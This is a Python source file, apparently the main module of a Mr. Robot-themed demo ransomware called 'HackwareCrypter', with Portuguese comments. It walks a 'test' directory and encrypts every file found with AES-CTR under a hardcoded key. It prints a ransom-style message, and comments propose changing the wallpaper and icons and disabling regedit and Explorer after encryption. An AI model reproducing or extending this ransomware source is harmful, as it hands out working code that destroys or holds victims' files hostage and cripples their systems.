# -*- coding: utf8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import sys
import Discovery
import Crypter

#------------
# a senha pode ter os seguintes tamanhos
# 128/192/256 bits - 8bits = 1byte = 1 caracter
#------------
HARDCODED_KEY = 'fsocietyfsocietyfsocietyfsociety'

def get_parser():
	parser = argparse.ArgumentParser(description="HackwareCrypter")
	parser.add_argument('-d','--decrypt', help='decripta os arquivos[default: no]', action='store_true')
	return parser

def main():
	parser = get_parser()
	args = vars(parser.parse_args())
	decrypt = args['decrypt']
	
	if decrypt:
		print('''
			Mr. ROBOT FSOCIETY
			---------------------
			Seus arquivos foram criptogrados.
			Para descriptá-los utilize a seguinte senha: {}'''.format(HARDCODED_KEY))
		key = input("digite a senha -> ")
	else:
		if HARDCODED_KEY:
			print("encrypting...")
			key = HARDCODED_KEY

	try:
		ctr = Counter.new(128)
		crypt = AES.new(key.encode("utf8"), AES.MODE_CTR, counter=ctr)
	except Exception as e:
		if "Incorrect AES key" in str(e):
			sys.exit('''
			****DANGER****
			---------------------
			SENHA INCORRETA''')

	if not decrypt:
		cryptoFn = crypt.encrypt
	else:
		cryptoFn = crypt.decrypt

	init_path = os.path.abspath(os.path.join(os.getcwd(), 'test'))
	startDirs = [init_path]

	for currentDir in startDirs:
		for filename in Discovery.discover(currentDir):
			Crypter.change_files(filename, cryptoFn)

	#limpa a chave de criptografia da memória

	for _ in range(100):
		pass

	if not decrypt:
		pass
		#após a enciptação, você pode alterar o walpaper
		#alterar os ícones, desativar o regedit, explorer etc 

if __name__ == '__main__':
	main()